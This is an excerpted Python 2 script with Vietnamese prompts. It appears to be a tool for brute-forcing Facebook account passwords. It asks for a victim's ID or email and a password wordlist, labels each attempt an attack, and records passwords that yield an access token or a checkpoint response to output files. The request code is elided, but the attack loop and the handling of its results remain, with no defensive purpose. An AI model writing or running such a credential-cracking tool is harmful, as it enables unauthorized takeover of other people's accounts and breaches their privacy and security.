...
def ceknet():
    try:
    	os.system('reset')
        print internet
        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mKiem tra ket noi internet...!'
        time.sleep(2)
        toolbar_width = 25
        ...
        try:
            ...
            time.sleep(3.5)
            print '\033[37;1m] \033[35;1m~> \033[32;1mThanh Cong...! '
            time.sleep(2.0)
            start()
        except requests.exceptions.ConnectionError:
            time.sleep(3.5)
            print '\033[37;1m]\033[35;1m ~>\033[31;1mKhong Co Ket Noi internet...!'
            time.sleep(1.5)
            sys.exit()
...
def start():
        try:
            os.system('reset')
            print banner
            email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Nhap ID \033[36;1mHoac \033[37;1mEmail \033[31;1m: \033[32;1m')
            passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Nhap File Thu Vien (cotcot.txt) \033[31;1m: \033[32;1m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mNan Nhan\033[36;1m :\033[32;1m ' + email
            time.sleep(3.0)
            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTONG So File \033[36;1m:\033[32;1m ' + str(len(total))
            time.sleep(3.0)
            print
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Tan Cong... \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
                    sys.stdout.flush()
                    ...
                    if 'access_token' in mpsh:
                        ...
                        dapat.write('[PW]=> ' + pw)
                        dapat.close()
                        print '\n\n\033[32;1m[+] \033[37;1mTim Mat Khau.'
                        print '\033[32;1m[+] \033[37;1mTai Khoan \033[32;1m: \033[35;1m'+email
                        print '\033[32;1m[+] \033[37;1mMat Khau \033[32;1m:\033[35;1m '+pw
                        print '\033[32;1m[+] \033[37;1mTrang Thai   \033[32;1m:\033[32;1m Thanh Cong...!'
                        print '\033[32;1m[=] \033[37;1mKet Thuc Chuong Trinh...!'
                        sys.exit()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ...
                            ceks.write('[PW]=> ' + pw)
                            ceks.close()
                            print '\n\n\033[33;1m[+] \033[37;1mTim Mat Khau.'
                            print '\033[33;1m[+] \033[37;1mTai Khoan \033[32;1m: \033[35;1m'+email
                            print '\033[33;1m[+] \033[37;1mMat Khau\033[32;1m:\033[35;1m '+pw
                            print '\033[33;1m[+] \033[37;1mTrang Thai  \033[32;1m:\033[33;1m Dang Kiem Tra...!'
                            print '\033[33;1m[=] \033[37;1mKet Thuc Chuong Trinh...!'
                            sys.exit()
                except requests.exceptions.ConnectionError:
                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mLoi Ket Noi..!'
                    sys.exit()

        except IOError:
            print '\033[37;1m[\033[32;1mx\033[37;1m]\033[37;1m Thu Vien Khong Ton Tai...!'
            print '\033[37;1m[\033[32;1mx\033[37;1m]\033[37;1m TUBE CON TO NIU...!'
            sys.exit()
